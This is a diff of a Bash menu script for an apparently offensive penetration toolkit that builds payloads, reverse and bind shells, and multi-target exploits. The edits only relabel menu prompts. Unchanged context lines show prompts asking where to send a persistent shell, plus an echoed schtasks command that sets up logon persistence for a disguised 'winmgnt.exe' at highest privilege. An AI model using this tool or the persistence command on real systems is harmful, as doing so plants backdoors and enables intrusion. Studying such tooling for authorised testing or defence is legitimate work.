@@ -217,7 +217,7 @@ case "$options" in
   # Accept upper or lowercase input.
   echo -e "\E[1;34m::::: \e[97mChoose Your Weapon\E[1;34m:::::"
 
-PS3='Enter your choice 8=Main Menu 9=QUIT: '
+PS3='Enter your choice ENTER=Options Menu 8=Main Menu 9=QUIT: '
 options=("Windows" "Linux" "Mac" "Android" "List_All" "Custom" "All The Payloads" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
@@ -289,7 +289,7 @@ done
   "2" | "2" )
 echo -e "\E[1;34m::::: \e[97mCreate a Listener\E[1;34m:::::"
 
-PS3='Enter your choice 2=Main Menu 3=QUIT: '
+PS3='Enter your choice ENTER=Options Menu 2=Main Menu 3=QUIT: '
 options=("Options" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
@@ -331,16 +331,16 @@ done
 echo -e "\E[1;34m::::: \e[97mPersistence Generator \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mBind Shells are a Work in Progress \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mThanks to Skysploit for the DBD Builder!! \E[1;34m:::::"
-PS3='Enter your choice 6=Main Menu 7=QUIT: '
+PS3='Enter your choice ENTER=Options Menu 6=Main Menu 7=QUIT: '
 options=("Windows DBD Reverse Shell" "Windows DBD Bind Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell" "Android" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
         "Windows DBD Reverse Shell")
 		clear
-		read -p "Where shall I send your persistent shell? " attackerip
+		read -p "Where shall I send your persistent shell? (LHOST)" attackerip
 		echo ""
-		read -p "What port will you be listening on? " attackerport
+		read -p "What port will you be listening on? (LPORT)" attackerport
 		echo ""
 		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
 		echo ""
@@ -400,7 +400,7 @@ do
 		echo -e "\E[1;34m\e[97m \e[31mschtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
             ;;
        "Windows DBD Bind Shell")
-        read -p "What port would you like the victim be listening on? " attackerport
+        read -p "What port would you like the victim be listening on? (RPORT)" attackerport
 		echo ""
 		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
 		echo ""
@@ -450,9 +450,9 @@ do
             ;;
         "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell")	
 		clear
-		read -p "Where shall I send your persistent shell? " attackerip
+		read -p "Where shall I send your persistent shell? (LHOST)" attackerip
 		echo ""
-		read -p "What port will you be listening on? " attackerport
+		read -p "What port will you be listening on? (LPORT)" attackerport
 		echo ""
 		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
 		echo ""
@@ -494,7 +494,7 @@ do
 			;;
 		"Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell")
 		clear
-		read -p "What port would you like the victim be listening on? " attackerport
+		read -p "What port would you like the victim be listening on? (RPORT)" attackerport
 		echo ""
 		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
 		echo ""
@@ -555,7 +555,7 @@ done
  echo -e "\E[1;34m::::: \e[97mExploit All The Things!!\E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
  
-PS3='Enter your choice 7=Main Menu 8=QUIT: '
+PS3='Enter your choice ENTER=Options Menu 7=Main Menu 8=QUIT: '
 options=("Multi-Target" "Multi-Port" "Multi-Target Struts" "Multi-Target Tomcat" "Multi-Target Java JMX" "Multi-Target Java RMI" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
@@ -704,7 +704,7 @@ done
          
 echo -e "\E[1;34m::::: \e[97mScan All The Things!!\E[1;34m:::::"
 
-PS3='Enter your choice 6=Main Menu 7=QUIT: '
+PS3='Enter your choice ENTER=Options Menu 6=Main Menu 7=QUIT: '
 options=("Multi-Port Auxiliary" "Multi-Target SNMP Enumeration" "Multi-Target Load Balancer Detection" "Multi-Target SSLScan" "Masscan All TCP Ports" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
@@ -773,7 +773,7 @@ do
     "Masscan All TCP Ports")
  echo -e "\E[1;34m::::: \e[97mMasscan All TCP Ports\E[1;34m:::::"
  
-PS3='Enter your choice 4=Main Menu 5=QUIT: '
+PS3='Enter your choice ENTER=Options Menu 4=Main Menu 5=QUIT: '
 options=("Run" "Options (enter manual targets for pause/resume support)" "Resume" "Main Menu" "Quit")
 select opt in "${options[@]}"
 	do
@@ -836,7 +836,7 @@ done
           
 #echo -e "\E[1;34m::::: \e[97mScan All The Things!!\E[1;34m:::::"
 
-#PS3='Enter your choice 2=QUIT: '
+#PS3='Enter your choice ENTER=Options Menu 2=QUIT: '
 #options=("Options" "Quit")
 #select opt in "${options[@]}"
 #do
@@ -868,7 +868,7 @@ done
   # Accept upper or lowercase input.
   echo -e "\E[1;34m::::: \e[97mCheck for Dependencies\E[1;34m:::::"
 
-PS3='Enter your choice 3=Main Menu 4=QUIT: '
+PS3='Enter your choice ENTER=Options Menu 3=Main Menu 4=QUIT: '
 options=("Dependencies" "DBD Installer" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
